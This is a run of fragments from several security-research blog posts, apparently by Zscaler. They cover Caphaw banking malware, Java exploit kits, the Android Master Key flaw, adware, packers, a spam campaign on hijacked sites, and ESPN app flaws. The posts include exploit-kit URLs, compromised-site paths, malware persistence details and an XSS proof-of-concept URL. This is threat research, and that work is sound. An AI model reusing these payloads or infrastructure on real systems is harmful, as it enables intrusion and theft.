          A binary executable (.exe) file is created in the attack sequence and masquerades as a .php file. This executable is created using Microsoft Visual C++ and the creator has not removed the debugging information from the final executable.        Both the location of where this file is dropped and the name of the file itself is selected quasi-randomly. For example, in one of the test instances we found this to be:       C: Documents and Settings\\user\\ApplicationData\\Sun\\Java\\Deployment\\SystemCache\\6.0\\9\\typeperf.exe             During the three instances of malware execution we ran in our BA lab, we observed the following executables and their drop locations:       \\Documents  and  Settings\\%USER%\\ApplicationData\\Sun\\Java\\utilman.exe    \\Documents  and  Settings\\%USER%\\ApplicationData\\Microsoft\\Proof\\eventtriggers.exe    \\Documents  and  Settings\\%USER%\\ApplicationData\\Microsoft\\Office\\cliconfg.exe              The malware makes the following significant API calls:       	LoadLibrary  	GetProcAddress  	Virtualalloc                 The  malware executable checks to see if it is running in a VM environment and also ensures that the host on which it is installed is connected to the Internet (failing which it will not run).         The malware also exhibits persistence by creating the following autorun entry in the registry:           HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run    dfrgntfs.exe      Unicode     C:\\Documents and Settings\\user\\Application Data\\Sun\\Java\\Deployment\\SystemCache\\6.0\\9\\typeperf.exe*  success or wait   1     B8EF5F      RegSetValueExA         Further, the executable when run, modifies the explorer.exe process to ensure that it\'s self-signed certificates are not cached and it also hides inside the explorer.exe process to ensure that the protection banner is hidden for a stealthier execution:          HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3      2500  dword 3     success or wait   1      DAEF5F      RegSetValueExA         HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings  DisableCachingOfSSLPages      dword 1     success or wait  1     DAEF5F      RegSetValueExA         HKEY_USERS\\Software\\Microsoft\\Internet Explorer\\Main  NoProtectedModeBanner   dword 1     success or wait   1     DAEF5F      RegSetValueExA         The malware then augments system processes to hinder its removal, once again for persistence:          328   C:\\WINDOWS\\system32\\wscntfy.exe     B30000      344064      D4 1E 5E EA 74 1E 9F 25 F9 CC 18 A3 28 FD 93 C3 1E 78 1D 8C AC 81 22 5F D3 DF AB 7E 34 3E 49 B5 D4 7A 45 F5 5D 15 72 6E 0F 93 F6 4C 2F E6 6D 31 16 6C E1 DD BB 23 F7 71 6D 06 A7 40 D7 A7 EB FE 12 70 30 28 92 BD 7F 1D 41 BE 44 5F 38 97 F5 27 E9 14 29 96 D1 28 05 C5 E5 D4 C8 72 94 D8 6A 11 EF 63 1D B4 89 A5 B8 FE 23 F2 1E C0 71 0E 18 7D 5B 74 B7 20 A1 5A 5F CE 27 FC 53 7E E7 D7 55 72 31 BA 28 54 33 25 22 88 A2 15 45 59 CE A5 CF 64 23 A7 AB E3 A4 4C C4 08 79 FC 5C BE 9C D1 FE 87 58 22 A4 B5 7D 64 29 E4 30 EC 87 D3 5D 1F F5 2B 4F A9 56 42 B9 6C B2 77 BD 90 C5 42 39 03 9E FD 93 E1 91 42 AF F8 1B 69 FD 2A 5E 5B 02 0A B4 6D FE FE 73 0C AE 6C AD D6 36 C3 6D EA 48 B5 85 58 E3 94 81 07 09 18 66 9F 63 79 8F C4 3D B1 CB D3 72 6C 45 4B 9B A3 3C 44 0B 61 57 98 7D 98 83    success or wait   1      DA8FB2      WriteProcessMemory       1612     164   7C8106E9    DC5A7B      C:\\WINDOWS\\explorer.exe success or wait   1     CC004D      CreateThread        	  		  			   		  		  			   		  	      Scope of the threat and impact    Further evidence of this being Caphaw exists in the banking information that it is listening for once it is injected into key Windows Processes.  Amongst all samples analyzed, we found the following 24 major banks\' sites were actively being monitored by the infection primarily to seek out the victim\'s online banking credentials.

Let\'s looks at an analysis of such an exploit kit recently found in the wild.       Exploit Kit URL:    hxxp://174.142.240.91/577ac477f62d4873cf41dc834d107b7c/influences-portal.php         When accessed, the above exploit URL executes obfuscated JavaScript and loads an applet into the browser as shown below:                Obfuscated source code:                  Let\'s analyze the above obfuscated JavaScript code by de-obfuscating it.

For the scope of this article, lets skip ahead to the end of the de-obfuscation process.          As usual, the exploit kit request loads content based on the version of the browser and versions of different plugins installed in a browser by running browser/plugin detection logic embedded in obfuscated JavaScript. The exploit kit targets vulnerabilities in JRE (Java) and Adobe components of the browsers.         Let\'s take a look at following de-obfuscated code which loads malicious applet into browser:                  The following code calls the relevant functions above, depending upon the JRE version found on the victim\'s machine:               The applet is executed by the browser, which then downloads a malicious .jar file from following URL,         hxxp://174.142.240.91/577ac477f62d4873cf41dc834d107b7c/influences-portal.php?gKoRO=UfhqAFb&gCTEVgSTdQbZjI=wUkSXV          The de-complied code of the downloaded .jar file is also heavily obfuscated.                   VT Result: 13 / 45    MD5:  361b0e1eab5e647315e6873ea16ca720       This .jar files exploits the vulnerability in the JRE, which allows the attacker to download additional malware and execute it the browser context.                   VT Result: 13 / 46     MD5: a151fdce265ba4fcab1b36bd624d330f       A Trojan then connects to the CnC server by sending POST data and in response, the CnC server replies with \'STATUS-IMPORT-OK\'.              After receiving command \'STATUS-IMPORT-OK\' from the CnC server, The Trojan then downloads another malware file (6.exe) from the same domain which looks to be a variant of ZerooAccess rootkit.

We found compromised websites that redirect the browser to an exploit kit, further leading to a drive-by-download dropper. The source was traced to originate from blackhat SEO redirections (yandex[.]ru).          The attack can be dissected into two stages, an injected malicious script which redirects to a domain and a second stage in which the domain sends the browser through an HTTP 302 redirect that finally leads to the landing page. The 302 redirection domains resolved to an IP range 192[.]133[.]137[.]0/24. The landing page domains were having a very low TTL and were hosted in sub-net 109[.]236[.]80[.]0/24 (AS49981). The server is hosted in NL. The campaign leveraged a DGA (Domain Generation Algorithm) along with Dynamic DNS to deliver the payload and the domains which delivered the exploit were ending with a [.info] TLD. The following snapshot shows some of the sample redirection and dynamically generated landing page domains.                                                                                             The mechanism of the attack is as follows. Firstly, a malicious redirection script is injected into the webpage:                                                                                                                                                                                                                     This is followed by a 302 redirect, which then leads to the exploit kit landing page.                                         The exploit kit favors the g01pack, which delivers a multistage exploit. Initially, it detects the browser plugins and versions thereof and then serves the exploits accordingly. At the time of analysis, I was using Java v1.6 release 26. The landing page was as follows:                                   As seen, the landing page also tries to deliver a Flash exploit. Unfortunately, at the time of analysis I was getting a 404 response for the SWF payload.                  The applet is loaded with the \"applet_ssv_validated\" passed as an undocumented parameter to the applet, which allows the attacker to carry out a JVM security bypass. The applet then makes the call to the malicious JAR file.                       The JAR file tries to exploit CVE-2012-0507 and drops the malicious executable. The snapshot summaries the code which carries this out.  Only two anti-virus vendors detected this JAR file as seen in this VirusTotal Report.                              The dropped EXE files are Ransomware/Fake AV/ZeroAccess Trojans, depending upon the payload delivered. Our Behavioral Analysis Engine flagged these files as malicious and the VirusTotal Report shows that 10/46 Anti-virus vendors detected this at the time of analysis. Also shown are some screen shots of the Ransomware/Fake AV after successful infection.                         Given it\'s rocky history with security, there has and will always be some buzz about new exploits against Java Plugins. Attackers will continue to own browsers as long as the Plugin is enabled and vulnerable. Refer to this post to learn how to stay protected from exploit kits.

The mobile app market is built on trust. Questionable mobile advertising practices, such as apps employing deceptive adware practices, negatively impact the end user’s perception of both privacy and the user experience. Doing things like capturing personal information such as email addresses, device IDs, IMEIs, etc. without properly notifying users and modifying phone settings and desktops without consent, is annoying and unacceptable for mobile users. While the majority of mobile ads are not malicious, they are undesirable for most.       Zscaler regularly analyzes applications in the Google Play store to profile apps and identify those presenting security and privacy risks. By studying this data, we have come up with some interesting statistics concerning the prevalence of ‘adware’ in apps permitted into the Google Play store. We have tracked the top 300 applications in each category             We have found around 1,845 applications which are flagged by one or more AV vendors as  including adware. This is a big number. Most of the applications were flagged by AV vendors due to their excessive inclusion of ads and deceptive practices for delivering them, including altering device settings. For example, many AV vendors flag the Airpush API as adware. Despite this fact, there are many apps within the Google Play store that include this API. This illustrates the conflicting interests that Google and the AV vendors have. It is in the best interests of Google to appease advertising companies. Google wants to encourage developers to expand offerings in their app store and developers often profit from free apps through advertising. Paid apps may also include advertising, in which case, Google takes a direct cut from from the app proceeds. Therefore, Google has plenty of incentive to allow apps with aggressive advertising practices. AV vendors on the other hand have no such incentive but are instead under pressure to show that they are adding value by identifying malicious/suspicious/unwanted content. As such, there is a big gap between Google and AV vendors when it comes to adware. Ultimately, end users are stuck in the middle as they are left to decide if they will keep or delete the apps being flagged. Other adware commonly flagged by AV vendors includes leadbolt, airmob, plankton  etc.                     We have collected the following AV data for apps flagged as including adware leveraging VirusTotal:    ·         Number of apps flagged by fewer than 5 AV vendors: 354    ·         Number of apps flagged by 5 to 10 AV vendors: 854    ·         Number of apps flagged by 10 to 15 AV vendors: 381    ·         Number of apps flagged by more than 15 AV vendors: 34         This above chart shows adware percentage in each app store category       This above chart shows adware percentages in each game category.              We have only considered the top 300 applications in each category.

Why are AV vendors flagging a huge number of applications as adware while Google is freely permitting them into the Google Play store? The excessive use of advertisements can negatively impact customer privacy and result in a negative user experience. On the other hand, advertisements are necessary for app developers looking to earn money when providing free apps. So where should the line be drawn? Google has clearly chosen to be very lenient with aggressive advertising practices, while Apple has taken the opposite approach, as they have shown that they’re willing to sacrifice advertising revenue to provide a positive user experience, even restricting the ability of advertisers to track device IDsand MAC addresses.    How do we define adware? We feel that adware exhibits one or more of the following intrusive behaviors without requesting appropriate user consent(ref- Lookout Blog)      	Harvests excessive personally identifiable information  	Performs unexpected actions in response to ad clicks without appropriate user consent (appropriate user consent entails providing a clear alert in the application that the user canaccept or decline before any behavior takes place)  	Collects IMEI numbers, UDIDs or MAC addresses  	Initiating phone calls and SMS messages  	Changing wallpaper and ringtones  	Leaks location information  	Leaks email addresses  	Leaks personal information such as contacts, birthdays, calendar appointments, etc            We base our own categorization of adware-enabled apps on the aforementioned definition. Hopefully Google and the AV vendors can reach a compromise in this ongoing adware battle as at present, end users are paying the price.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/gap-between-google-play-and-av-vendors-adware-classification');

This impacts almost all current Android implementations and to make matters worse, patches cannot be issued directly by Google, but require individual handset manufacturers to provide patches for their unique Android implementation. To date, some have provided patches, while others haven’t.\r\n\r\nThis vulnerability allows an attacker to inject malicious code by placing duplicate executable files – such as classes.dex – into an application package. The package verification that occurs during installation is done against only the original, legitimate file and thus the .apk passes the verification. However, at runtime, the duplicate .dex file will also be executed. The attacker’s malicious code in the second classes.dex may for example, have a routine for leaking personal information such as email addresses or IMEI numbers. It could also send SMS or make calls without user consent. A second AndroidManifest.xml file supporting the second classes.dex, replaces the legitimate .xml file, so that additional permission declarations are injected along with necessary permissions needed by the malicious classes.dex file. \r\n\r\nOpen source tools are already available which allow for code to be injected into an .apk file and modify the Android manifest file to take advantage of this vulnerability. One such tool is available here -  https://gist.github.com/poliva/36b0795ab79ad6f14fd8. \r\n\r\nWhile a user may notice the excessive permissions that are required by the second android manifest file at the time of installation, it’s quite likely that this attack will go completely undetected. As apps have already been spotted in the wild exploiting this vulnerability, Zscaler has developed a simple web application designed to scan any .apk to identify those apps that are exploiting the Android Master Key vulnerability. Our web app works by checking the integrity of the .apk file. Specifically, it dissects the .apk file to look for the presence of additional, malicious classes.dex files or any extra Android manifest files. You simply need to upload any .apk to the scanner in order to obtain a report indicating if the Android app is taking advantage of this vulnerability. \r\n\r\nThe scanner is freely available and can be found at https://zulu.zscaler.com/ \r\n\r\nScan your apps and be safe.', 'Vulnerability', 'https://www.zscaler.com/blogs/research/zscaler-releases-android-master-key-vulnerability-scanner');

The applet creates a URL Connection Steam to download the encrypted binary stream. The binary stream is then decrypted using the AES CBC 128 bit cipher block chaining scheme.

Today, Zscaler identified yet another mass website compromise, this one impacting a number of popular media sites, including two radio stations in Washington, DC - Federal News Radio and WTOP. It\'s not clear if all of the sites impacted were leveraging a common backend platform that may have led to the compromise.    Sadly, mass compromises are now the norm. Attacks targeting end users generally involve some form of social engineering whereby the potential victim must be convinced to visit a site, download a file, etc. Attackers will therefore write a script designed to comb the web looking for popular sites exposing a common flaw and when identified, inject a single line of malicious code into the sites. In that way, any user visiting the otherwise legitimate (but now infected) site, can become a victim. This particular threat also displays another common trait - being dynamic in nature and only delivering content if the victim browser exhibits certain attributes. In this case, the injected content is only displayed when the browser\'s User Agent string reveals that Internet Explorer (IE) is being used.  When IE is used to view one of the infected pages, the following code is sent to the browser:              	  		  			  		  		  			Ofuscated JavaScript injected into a webpage at WTOP.com  		  	        	  		  			  		  		  			Deobfuscated version of the injected code  		  	    This obfuscated JavaScript decodes to reveal an iFrame pointing to sites hosted at Dynamic DNS (DynDNS) hosting providers.

It made headlines recently because it is starting to present a real alternative for traditional online payments, and has recently experienced wild swings in value.\r\n\r\nOne of the advantages of Bitcoin is the lack of regulation, which means it is largely free from the rules and regulations that govern banks and payment processing companies when dealing with \"real\" currencies. Payment transfers are also fast and free.\r\n\r\nFor me, Bitcoin actually highlights the benefits of strong regulation, which protects consumers.\r\n\r\nYour Bitcoin Wallet is Actually Your Bank\r\n\r\nBitcoin users keep their currency in a Bitcoin \"wallet\". I think wallet is really a misnomer, it should be called a Bitcoin Bank since it holds all of the users currency, not simply want he wants to spend in the near future. A Bitcoin wallet is unsecured like a regular wallet - money can be stolen and the user as no recourse.\r\n\r\nPeople don\'t hold all their savings at home because they know that doing so is not safe. Instead, they put their savings into a bank which offers protections, including being FDIC insured. However, many Bitcoin users keep all their Bitcoins on their own computer or mobile device. They are on their own to keep their system secure and have no insurance to cover loses, whether unintentional, or due to breaches in security.\r\n\r\nThere is nothing equivalent to a credit card in the Bitcoin world. While credit cards impose a fee on all transactions, they do provide significant protection to consumers. They allow people to carry and transfer money (like the cash in a wallet), while still benefiting from the strong protection of a bank. If a personal credit card is stolen and used, the owner will be reimbursed. The owner can also dispute charges and get reimbursed quite easily if a vendor does not deliver the product or service once paid.\r\n\r\nBitcoin users bear all the risks and we\'ve already seen plenty. For example, there has been malicious software designed to steal from Bitcoin wallets. Recently, a malicious site faking a well known Bitcoin exchange contained an exploit that transferred money out of the Bitcoin wallet when users visited the site. There have also been many trojans and worms focused on stealing Bitcoins.\r\n\r\nNo Secure Bank\r\n\r\nBitcoin users can opt for storing their money in online Bitcoin Wallets. These could be construed as the equivalent of Online Banks...but without the insurance and security! Due to the absence of regulation, these online wallets don\'t have to adhere best security practices, have no audits and no certifications. It should not therefore come as a surprise that many Bitcoin online wallets have been hacked.\r\n\r\nIn one occurrence, the online Bitcoin wallet was hosted on a VPS (Virtual Private Server), which is a shared resource. This would have never been allowed for a bank. The attacker stole about $228,000 worth of Bitcoins at the time.\r\n\r\nJust this month, InstaWallet was hacked. Users lost their Bitcoins and no insurance company will be reimbursing them. All is lost, forever.\r\n\r\nWhile Bitcoin has some advantages, the risks of storing the money is just too high. Online wallets and exchanges can\'t be trusted as too many of them has shown to be run in a very unprofessional and insecure manner. Every time, the users pay the price.\r\n\r\nIf you can\'t keep your Bitcoin wallet encrypted and split onto 3 different secure USB keys in 3 different safes like the Winklevoss twins, Bitcoin is probably not for you.', 'Compromise', 'https://www.zscaler.com/blogs/research/bitcoin-regulations-and-security');

Currently, more than 60% of malware samples are packed by PE packers. What is a packer? A packer is a type of archive tool that compresses and encrypts other executable files in a disk and restores the original executable images when the packed files are loaded into memory. However, we can’t jump to the conclusion that every packed file is malicious. Some commercial packer vendors offer packers to protect applications against Reverse Engineering (RE), by putting the content of those applications into a strong protection “shell”.\r\n\r\n \r\n\r\n\r\nA packed file is a type of archived file, but packed and regular archives are quite different. Users have to extract an archived file onto a hard disk before they can access the contents. On the other hand, a PE packed file is normally unpacked in memory. There are many archived files, such as zipped files, in Windows OS folders. So how many of them are packed? In this post, I will share my findings on searching for packed files in the Windows 8 OS. \r\n\r\n\r\nThe tools I am using here are PEiD and ExeInfo, two popular packer detectors. 1,832 signatures were picked from PEiD v0.93, and 3,281 rules from ExeInfo. The packer signature database of PEiD is a subset of that of ExeInfo. I also removed some non-packer rules from ExeInfo. As usual, I chose REer\'s favorite folder, \\Windows\\System32, as the testing folder. First, I scanned that folder with PEiD, and received a couple of packer detection results. Among them, the signatures for \"Armadillov1xxv2xx\" and \"Armadillov171\" triggered false positives. Those signatures search for the following binary strings from OEP respectively. In this case, you can ignore them.\r\n\r\n \r\n\r\nArmadillov1xxv2xx\r\n\r\n55 8B EC 53 8B 5D 08 56 8B 75 0C 57 8B 7D 10 85 F6\r\n\r\n \r\n\r\nArmadillov171\r\n\r\n55 8B EC 6A FF 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 64 A1\r\n\r\n \r\n\r\nI also found that ExeInfo itself was packed by the UPX packer.\r\n\r\n\r\n\r\n\r\nHere we identified the first low-hanging fruit: \\system\\SysWOW64\\DCBassSourceMod.ax, which is an audio decoder file. It\'s section names show that it is UPX packed, but PEiD detected it as ACProtector packed. ExeInfo did a better job: it caught that file as UPX packed.\r\n\r\n\r\n\r\n\r\nNext, the \"Petitev14\" signature detected quite a few files as Petite packer. They are all located in the \\system32\\SysWOW64 folder. Interestingly, most of their PE section names are empty. How odd!\r\n\r\n\r\nI saved the best to for last!

However, it appears to me that this file was maybe packed by a customized version of ACProtector (correct me if wrong).  By extracting all strings from this file, you will have a big picture of how many packers MpEngine can handle with.\r\n \r\n\r\n Last but not the least, a couple of additional files from different vendors are also packed.

In the case of server-side polymorphism, which causes each downloaded file to be a unique version, will force the client to send files constantly. The battery constrains will be a serious issue.\r\n\r\nSecurity vendors are facing various challenges regarding the architectural design, implementation, and validation on mobile anti-malware. New techniques need to be designed to handle with the constraints of the mobile platform. Zscaler\'s ZAP (Zscaler Application Profiler) is web based tool designed to streamline the capture and analysis of HTTP(S) traffic from mobile applications. ZAP is capable of analyzing traffic from both iOS and Android applications and includes the following functionality.\r\n\r\nFor additional details on how to use ZAP and view a video walkthrough, please see the ThreatLabZ blog.', 'Mobile', 'https://www.zscaler.com/blogs/research/twins-born-different-years-even-different-faces-pc-av-cloud-and-mobile-av-cloud');

We want to thank ESPN for working quickly to protect their users.\r\n\r\nBackground\r\n\r\nESPN ScoreCenter is a popular sports application on the iOS platform (currently the #1 free sports app in iTunes). The app delivers live scores, news, video, alerts, etc. and is an official application of ESPN Inc. Version 3.0 of the app features a completely redesigned the UI, but also includes a couple of key vulnerabilities.\r\n\r\nVulnerability #1 - XSS\r\n\r\n\r\n\r\nWe tend not to think of mobile applications as being vulnerable to cross-site scripting (XSS). After all XSS belongs to the domain of web applications and mobile apps are native apps. Right? Not necessarily. Many mobile apps are actually just web pages displayed in a WebView control or more commonly web content mixed in with native controls and such is the case for ESPN SportsCenter. As with many web apps, when user supplied content isn\'t properly sanitized, active content, such as JavaScript can be injected. The included screenshot illustrates a simple alert window being displayed within the application. The vulnerable page also exists on the mobile web version of the app during logout and can be seen in the following sample URL:\r\n\r\n \r\n\r\nhttp://m.espn.go.com/mobile/apps/reg/login?lang=en&timeOffset=-300&swid=63DBACA2-032F-491E-A28D-1B4835DC14XX&username=%3Cscript%3Ealert(\'test\')%3C/script%3E\r\n\r\n \r\n\r\nXSS is of course valuable for a variety of attacks, such as stealing a user\'s authentication cookie, however, in this case that may not be necessary, thanks to vulnerability #2...\r\n\r\nVulnerability #2 - Clear Text Authentication Credentials\r\n\r\nI\'m continually surprised by just how common it is for mobile applications to pass authentication credentials in clear text. Mobile apps often pose a higher risk than their web based counterparts and this illustrates the reason why. In many ways, mobile apps behave like web apps, but without the many visual controls provided to end users to spot and avoid insecure behavior. In a web app for example, if your password is about to be sent insecurely, you have warning signs. Perhaps you notice that SSL is not being enabled as you don\'t see the lock icon or perhaps SSL is being used but with an invalid certificate which you are warned about by a standard popup message. In mobile apps, these same vulnerabilities exist, but end users are blind to them as mobile app developers do not have to include any warning signs and in an effort to conserve screen real estate, generally don\'t. Think about it, when viewing web content in a mobile app, you normally have no way of knowing where the content is actually coming from because there is no address bar to reveal the source URL.\r\n\r\n \r\n\r\nESPN ScoreCenter\'s flaw - sending your password in clear text. Therefore, anyone sniffing traffic on the network would be able to easily steal your username/password. More often than not, when I see this flaw, it occurs not during a regular login, but rather when you first set up your account and such is the case with ESPN SportsCenter. Once you\'ve created an account, subsequent logins at the regular login page (/mobile/apps/reg/loginlanding) are sent via HTTPS. This is not the case however when an account is first created, with the username/password sent in clear text : \r\n\r\n\r\nhttp://m.espn.go.com/mobile/apps/reg/createaccount\r\n\r\nPOST /mobile/apps/reg/createaccount HTTP/1.1\r\nHost: m.espn.go.com\r\nAccept-Language: en-us\r\nPragma: no-cache\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A551\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: http://m.espn.go.com/mobile/apps/reg/createaccount\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nCookie: s_vi=62b95c266882437b80b87bd3e078cac5805e20de20a8387999d1c6b02c74a2d6\r\nProxy-Connection: keep-alive\r\nContent-Length: 329\r\nOrigin: http://m.espn.go.com\r\nAccept-Encoding: gzip, deflate\r\n\r\npassedSubId=&langCode=&udid=&version=&userAgent=Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+6_0_2+like+Mac+OS+X%29+AppleWebKit%2F536.26+%28KHTML&country=US&form=true&policies=true&firstname=ThreatLabZ&lastname=Zscaler&username=ThreatLabZ&gspw=Zscaler&email=threatlabz%40zscaler.com&birthdayMonth=1&birthdayDay=2&birthdayYear=1973 \r\n\r\nConclusion\r\n\r\nIt isn\'t hard to uncover security flaws such as this, it simply requires inspecting the HTTP(S) traffic sent by an application. It is disappointing to see that the testing performed on apps before they are admitted by Apple to the iTunes store does not even include such basic security tests such as looking for XSS vulns and sending passwords in clear text.\r\n\r\n \r\n\r\nThese flaws were uncovered by leveraging Zscaler\'s free ZAP (Zscaler Application Profiler) service to inspect the application traffic.

This vulnerability is present in Oracle Java 1.7.0 to 1.7.10 and has already been included in a variety of browser exploit kits. On January 13, 2013, Oracle released a fix for the issue in the form of Java 1.7.11.    Java has a long history of 0-day vulnerabilities being actively exploited. Exploits are usually drive-by attacks: users get infected by navigating to hijacked websites where an invisible Java applet drops a malicious executable on the user\'s machine. The very popular, Blackhole exploit kit includes numerous Java exploits.    This vulnerability has been exploited very quickly on the Internet. Firefox reacted quickly by flagging all versions of Java as vulnerable plugins. This means Java is disabled by default on Firefox and users get warned if a page requires the use of Java. It would appear that the work they recently did on their Click to Play feature for vulnerable plugins has paid off. Apple took a similar approach by pushing out a new malware definition list that rather than blocking malware, as it generally does, simply disabled the Java Web Start browser plugin altogether.    Are you vulnerable?    The latest iteration of Java is version 1.7 revision 11. This is now the default version on Windows. Although Java 1.6 is not vulnerable to this latest threat, Java 1.6\'s end of life is February 2013, so you should not downgrade to that version.    One annoying fact with Java is that new versions are installed on top of each other. As such, you are likely to have multiple versions of Java installed on your system. Internet Explorer may not even be using the latest version of Java that you have installed.    We have therefore created a new page to list all of the versions of Java installed on your computer. You can test your browser here.    Disable Java    To be on the safe side, you can disable Java in your browser to prevent malicious applets from running.

This time, I\'ll show what happens in the days and weeks before the campaign starts. I\'ve found two examples that show the steps that are taken by the spammers in preparation of their campaign.    First step: hijack websites    The spammers need to ensure that its spam e-mails or messages are not quickly flagged as spam. One technique to avoid spam filters it to use existing websites with a good reputation to redirect users. These domains would not be part of any blacklists and should already be known and categorized by vendors. This is a better alternative to the free hosting and DNS providers, which may not have a good reputation like .co.cc and .tk.    Unfortunately, hacking legitimate websites in large numbers is quite easy these days. Popular open-source platforms, like WordPress, Joomla and Drupal, contain a lot of security vulnerabilities (in the core software and the plugins), which attackers can take advantage of.    The first campaign I spotted was hijacking German Joomla! sites. All the hijacked sites seem to be running Joomla 1.7. I\'m not sure if the attacker used the privilege escalation issue, the XSS vulnerability or one of the 23 other vulnerabilities found in 2013.    The other campaign targeted WordPress sites, an open-source platform loved by webmasters and attackers.    Step 2: hide the malicious page before the campaign.    Rather than modifying the exiting page, new pages are added to the hijacked sites. The attackers often put these files in hidden directories (starting with a dot), temporary folders, or plugin folders.    The Joomla sites were having malicious files put in /tmp/, such as:    	hxxp://www.original-ettaler.de/tmp/gmmsxlibort.php  	hxxp://www.neumann-arbeitsbuehnenvermietung.de/tmp/gmmsxlibort.php  	hxxp://www.myatrium.de/tmp/gmmsxlibort.php  	hxxp://www.optik-boysen.de/tmp/gmmsxlibort.php  	http://www.onepos.de/tmp/gmmsxlibort.php  	etc.    For the WordPress sites, the attackers hid the malicious files in folders used by common WordPress plugins and themes:      	http://gv-global.com/components/com_ag_google_analytics2/gmmsx.html  	http://www.highontheheart.com/wp-content/themes/twentytwelve/gmmsx.html  	http://dreamzinfrabangalore.org/wp-content/themes/twentytwelve/gmmsx.html  	http://jivakafoundation.org/components/com_ag_google_analytics2/gmmsx.html  	http://agg-systems.eu/components/com_ag_google_analytics2/gmmsx.html  	http://vacationrentalbusiness.net/wp-content/themes/twentytwelve/gmmsx.html  	etc.            Step 3: keep out security scanners    Attackers don\'t want security tools to flag their redirection pages as malicious before the campaign. One common technique involves making the pages redirect all visitors to a random website, like http://www.google.com/ until the campaign is ready to start.    When the campaign is running, the redirection pages will still try to separate legitimate users from security scanners. They can check the IP address of the visitor, use Flash or JavaScript to make the redirection and use cookies or IP addresses to track visitors and allow them to visit once only, etc.    Step 4: open the curtains    Once the spammer has gathered enough legitimate sites and e-mails or messages are being sent out, the redirection pages point users to the malicious site.    For the Joomla campaign, the final spam page is hxxp://www.dailynews.com.2012.fashion.italy.moda.trends.luxurynws.com/. As often is these type of scams, the page looks like an official news paper article extolling the merits of some product or work from home scheme. In this case, the products are replicas of luxurious watches.       	  		  			  		  		  			Fake news article about replica watches  		  	    The second spam campaign redirect to the usual Work from Home scam at hxxp://newsmarket3nextgenonline.com/?12/2.

Combine that with the old guard of the security and networking industries desperate to stay relevant in a mobile future and it\'s sure to be an interesting year.\r\n\r\n \r\n\r\nBig data goes big time - Perhaps the strongest metric for a security technology reaching the \'peak of inflated expectations\' comes every spring at the RSA Conference. A quick perusal of the most common marketing slogans decorating vendor booths reveals which technologies are about to blanket airport billboards the world over. \'Cloud\' has held that lofty title for the past couple of years, but get ready for \'big data\'. A host of security companies promising to better collect, manage and summarize security data to find the security needles in a haystack are about to take center stage and you can be rest assured that the old guard will quickly repackage existing solutions to join the party.\r\n\r\nMedium\r\n\r\n \r\n\r\nDetection vs Prevention - I recently attended a talk by Art Coviello, the President and CEO of RSA Security in which he argued that the general budget spent on security solutions promising Prevention/Detection/Response capabilities is approximately an 80%/15%/5% split. I agree and it illustrates that enterprises place far too much emphasis on prevention and the approach simply isn\'t working. The unfortunate reality for enterprises is that compromised PCs and data breaches are a daily fact of life. Even a budget focused 100% on prevention will not eliminate these issues. Spending too little on detection however, will guarantee that these incidents go unnoticed and small compromises turn into catastrophic losses. Fortunately, thanks to increasing openness regarding compromises (some voluntary, some legal), enterprises will begin shifting their security budget toward detective controls.\r\n\r\n \r\n\r\nMobile privacy - vendors called to the mat - Malicious mobile apps are like the pretty blonde at the party - even though they lack substance, they get all the attention. When a keystroke logger slips through the cracks and shows up, even for a brief period in the Google Play store, it\'s front-page news. If however, an app gathers end user personally identifiable information, shares it with third parties and leaks millions of passwords, the media barely blinks an eye. The latter app scenario is however infinitely more common than the first. Truly malicious apps are relatively rare in official app stores such as Google Play and they\'re extremely rare in Apple\'s App Store. On the other hand, apps with blatant privacy concerns are extremely common. Thanks to an increasing focus by researchers on privacy concerns and projects such as ZAP, 2013 will be the year that vendors and App Store gatekeepers can no longer ignore privacy issues.\r\n\r\n \r\n\r\nHacking the \'Internet of things\' - We keep hearing about the \'Internet of things\' - connected hardware devices to ensure that our digital lifestyle is always online and always accessible, no matter where we are. From thermostats to garage door openers to security systems and appliances, traditional electronics are now Internet connected. The hardware industry unfortunately has a rather abysmal history when it comes to \'baking security in’; so expect this wave of connected hardware to present a vast amount of low hanging fruit for security researchers.\r\n\r\nBold\r\n\r\n \r\n\r\nMicrosoft finally dances with the devil - Paying for vulnerability information is no longer the moral sin that it once was. Vendors such as Mozilla and Google long ago made it an acceptable practice to reward security researchers for their hard work in uncovering vulnerabilities in their software by offering at least moderate financial rewards. Despite this trend, Microsoft has stubbornly clung to the line that they do not and will not pay for vulnerability information, despite the great benefit they receive when \'responsible disclosure\' is followed and Microsoft is provided such information for free. That said, Microsoft has continued to make slow but steady steps forward - Bluehat, security conference sponsorship, financial rewards for the capture of malware authors, etc. As Microsoft realizes the need to ensure security as a differentiator for Windows 8/RT against mobile competitors, expect this to be the year they finally break their own rule.\r\n\r\n \r\n\r\nThe privatization of malware - The malware economy continues to become increasingly specialized, with individuals and groups often focusing on a single portion of an overall attack, be it reverse engineering, exploit creation, botnet herding, etc. With the value of a 0day vulnerability in a popular program now well into the six figure range, we\'re no longer simply talking about low brow criminals dabbling in this world. White-collar researchers are parting with vulnerability information, selling it to a middleman and not asking questions about where it may end up. This trend will continue, but expect new participants to enter the fray, namely nation states. Governments, the US government included, have shown increasing comfort leveraging online attacks to achieve specific goals, such as was the case with Stuxnet, or to enhance traditional physical attacks. Nation states, desperate for top talent to stay ahead, will not confine themselves to only homegrown talent but become increasingly aggressive bidders on the open market. Unlike physical weapons whose R&D costs limit their production to governments willing to spend billions, 0day information thrives in the private market.\r\n\r\n \r\n\r\nSee you next year!\r\n\r\n \r\n\r\n- michael', 'Cloud', 'https://www.zscaler.com/blogs/research/2013-security-predictions');

